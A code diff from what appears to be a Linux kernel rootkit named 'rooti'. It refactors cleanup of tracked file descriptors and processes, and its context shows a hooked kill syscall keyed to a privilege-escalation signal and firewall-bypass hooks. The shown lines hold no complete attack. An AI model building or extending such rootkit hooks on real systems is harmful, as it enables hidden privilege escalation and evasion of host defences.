@@ -71,7 +71,7 @@ static void (*orig_do_exit)(long code);
 static asmlinkage long hook_kill(const struct pt_regs *regs)
 {
     int sig = regs->si;
-    // TODO: clear remaining records
+
     switch (sig)
     {
     case ROOTI_SIG_PE:
@@ -351,15 +351,11 @@ static void __exit rooti_exit(void)
     // Uninstall firewall bypassing hooks
     rooti_uninstall_fw_bypass_hooks();
     
-    struct rooti_tracked_fd *record;
-    struct rooti_tracked_fd *tmp;
-
     // Release any remaining records
     for (int i = 0; i < ARRAY_SIZE(rooti_tracked_fds_lists); i++) {
-        list_for_each_entry_safe(record, tmp, rooti_tracked_fds_lists[i], head) {
-            rooti_untrack_fd(record);
-        }
+        rooti_clear_fd_tracking(rooti_tracked_fds_lists[i]);
     }
+    rooti_clear_proc_tracking(&rooti_tracked_procs);
 }
 
 module_init(rooti_init);
